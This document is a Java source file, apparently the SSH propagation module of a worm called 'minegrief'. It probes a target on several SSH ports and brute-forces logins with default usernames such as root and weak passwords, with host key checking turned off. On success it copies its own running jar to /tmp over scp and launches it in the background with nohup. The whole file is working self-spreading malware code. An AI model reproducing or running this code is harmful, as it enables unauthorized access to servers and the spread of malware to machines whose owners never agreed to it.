package com.chebuya.minegriefagent.modules;

import com.jcraft.jsch.*;

import java.io.*;

import static com.chebuya.minegriefagent.util.Logging.LOGGER;
import static com.chebuya.minegriefagent.util.Network.isPortOpen;


public class SSH {

    private static final int[] SSH_PORTS = {22, 2022, 2024, 2222, 2224, 2223, 22222, 7477};
    private static final int TIMEOUT = 5000;
    private static final String[] USERNAMES = {"root", "ubuntu", "admin"};
    private static final String[] PASSWORDS = {"password", "Password123"};

    public static boolean attackSSH(String target) {
        for ( int port : SSH_PORTS ) {
            if (!isPortOpen(target, port)) {
                continue;
            }

            LOGGER.info("discovered an open ssh port on " + target + ":" + port);

            String[] creds = bruteSSH(target, port);
            if (creds.length == 0) {
                continue;
            }

            LOGGER.info("found valid ssh creds for " + target + ":" + port + ": " + creds[0] + ":" + creds[1]);
            return true;
        }

        return false;
    }

    private static String[] bruteSSH(String target, int port) {
        for ( String username : USERNAMES ) {
            if (loginSSH(target, port, username, username)) {
                return new String[] {username, username};
            }

            for ( String password : PASSWORDS ){
                LOGGER.info("attempting " + username + ":" + password + " against " + target);
                if (loginSSH(target, port, username, password)) {
                    return new String[] {username, password};
                }
            }

        }

        return new String[] {};
    }

    private static boolean loginSSH(String target, int port, String username, String password) {
        JSch jsch = new JSch();
        Session session = null;
        ChannelExec scpChannel = null;
        ChannelExec execChannel = null;

        try {
            session = jsch.getSession(username, target, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            session.setConfig("PubkeyAcceptedKeyTypes", "ssh-rsa," + session.getConfig("PubkeyAcceptedKeyTypes"));
            session.setConfig("PreferredAuthentications", "publickey,keyboard-interactive,password");

            session.connect(TIMEOUT);

            String lfile = System.getProperty("sun.java.command");

            scpChannel = (ChannelExec) session.openChannel("exec");
            String command="scp -t /tmp/minegrief.jar";
            scpChannel.setCommand(command);

            OutputStream out = scpChannel.getOutputStream();
            InputStream in = scpChannel.getInputStream();

            scpChannel.connect();

            if(checkAck(in)!=0){
                LOGGER.warning("error while connecting scpChannel");
                return false;
            }

            File _lfile = new File(lfile);
            long filesize=_lfile.length();
            command="C0644 "+filesize+" ";
            if(lfile.lastIndexOf('/')>0){
                command+=lfile.substring(lfile.lastIndexOf('/')+1);
            }
            else{
                command+=lfile;
            }
            command+="\n";
            out.write(command.getBytes()); out.flush();
            if(checkAck(in)!=0){
                LOGGER.warning("error while writing scpChannel");
            }


            FileInputStream fis = new FileInputStream(lfile);
            byte[] buf = new byte[1024];
            while(true){
                int len = fis.read(buf, 0, buf.length);
                if(len <= 0) break;
                out.write(buf, 0, len);
            }
            fis.close();
            fis = null;
            buf[0]=0; out.write(buf, 0, 1); out.flush();
            if(checkAck(in) != 0){
                LOGGER.warning("error while writing scpChannel");
            }
            out.close();


            execChannel = (ChannelExec) session.openChannel("exec");
            String postCommand = "nohup java -jar /tmp/minegrief.jar &";
            execChannel.setCommand(postCommand);

            InputStream execIn = execChannel.getInputStream();
            InputStream execErr = execChannel.getErrStream();

            execChannel.connect();

            byte[] tmp = new byte[1024];
            while (true) {
                while (execIn.available() > 0) {
                    int i = execIn.read(tmp, 0, 1024);
                    if (i < 0) break;
                    LOGGER.info(new String(tmp, 0, i));
                }
                while (execErr.available() > 0) {
                    int i = execErr.read(tmp, 0, 1024);
                    if (i < 0) break;
                    LOGGER.warning(new String(tmp, 0, i));
                }
                if (execChannel.isClosed()) {
                    if (execIn.available() > 0 || execErr.available() > 0) continue;
                    LOGGER.info("Command exit status: " + execChannel.getExitStatus());
                    break;
                }
            }
            return true;
        } catch (JSchException e) {
            LOGGER.warning("JSch exception connecting to " + target + ": " + e.getMessage());
            return false;
        } catch (Exception e) {
            LOGGER.warning("exception connecting to " + target + ": " + e.getMessage());
            return false;
        } finally {
            if (session != null && session.isConnected()) {
                session.disconnect();
            }

            if (scpChannel != null && scpChannel.isConnected()) {
                scpChannel.disconnect();
            }

            if (execChannel != null && execChannel.isConnected()) {
                execChannel.disconnect();
            }
        }
    }




    private static int checkAck(InputStream in) throws IOException {
        int b = in.read();
        if(b == 0) return b;
        if(b == -1) return b;

        if (b==1 || b==2) {
            StringBuffer sb = new StringBuffer();
            int c;
            do {
                c = in.read();
                sb.append((char)c);
            }
            while(c != '\n');
            if(b == 1){
                System.out.print(sb.toString());
            }
            if(b==2){
                System.out.print(sb.toString());
            }
        }
        return b;
    }
}
